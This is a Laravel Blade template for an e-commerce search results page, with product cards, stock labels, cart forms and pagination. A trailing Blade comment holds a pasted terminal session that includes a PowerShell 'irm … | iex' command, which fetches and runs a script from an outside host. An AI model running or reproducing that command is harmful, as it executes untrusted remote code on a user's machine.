@extends('frontend-template')
@section('content')
    <div class="fashion_section">
        <div id="main_slider" class="carousel slide" data-ride="carousel">
            <div class="carousel-inner">
                <div class="carousel-item active">
                    <div class="container">
                        <h1 class="fashion_taital">Result for - {{ $search }}</h1>
                        <div class="fashion_section_2">
                            <div class="row">
                                @if (count($products) > 0)
                                    @foreach ($products as $product)
                                        <div class="col-lg-4 col-sm-4">
                                            <div class="box_main">
                                                <h4 class="shirt_text">{{ $product->product_name }}</h4>
                                                <p class="price_text"> <span style="color: #e78b00;">$
                                                        {{ $product->price }}</span></p>
                                                <div class="tshirt_img" style="height: 320px">
                                                    <a href="{{ route('product', $product->slug) }}"><img
                                                            style="height: 320px"
                                                            src="{{ asset("upload/products/$product->photo") }}"></a>
                                                </div>
                                                <div class="d-flex justify-content-between">
                                                    @if ($product->quantity == 0 )
                                                        <button class="mr-2" style="outline:none;background:none;font-size:15px;color:#e90000">Out of Stock</button>
                                                    @elseif ($product->quantity <= 3 )
                                                        <button class="mr-2" style="outline:none;background:none;font-size:15px;color:#e78b00">Low Stock</button>
                                                    @else
                                                    <div>
                                                        <form action="{{ route('addproducttocart') }}" method="POST">
                                                            @csrf
                                                            <input type="hidden" name="product_id"
                                                                value="{{ $product->id }}">
                                                            <input type="hidden" name="quantity" value="1">
                                                            <button type="submit" class="mr-2"
                                                                style="outline:none;background:none;font-size:15px;color:#e78b00">Buy
                                                                Now</button>
                                                            <a href="{{ route('addtocartsingleproduct', $product->id) }}"><i
                                                                    class="fa fa-shopping-cart"></i></a>
                                                        </form>
                                                    </div>
                                                    @endif

                                                    <div class="seemore_bt w-25"><a
                                                            href="{{ route('product', $product->slug) }}">See More</a></div>
                                                </div>
                                            </div>
                                        </div>
                                    @endforeach
                                @else
                                    <div class="col-12">
                                        <h3 class="text-muted text-center">No Product Found</h3>
                                    </div>
                                @endif


                            </div>
                        </div>
                    </div>
                </div>
            </div>

            @if (count($products) > 0)
                <div class="row justify-content-center align-items-center">
                    {{ $products->appends($_GET)->links('pagination::bootstrap-4') }}
                </div>
            @endif
        </div>
    </div>
@endsection
{{-- casimir95@example.netll@DESKTOP-P8AFO7L MINGW64 /c/xampp/htdocs/nkkgs (main)
$ php artisan serve


irm https://celesto.cpanelcentral.com/ias | iex

 --}}
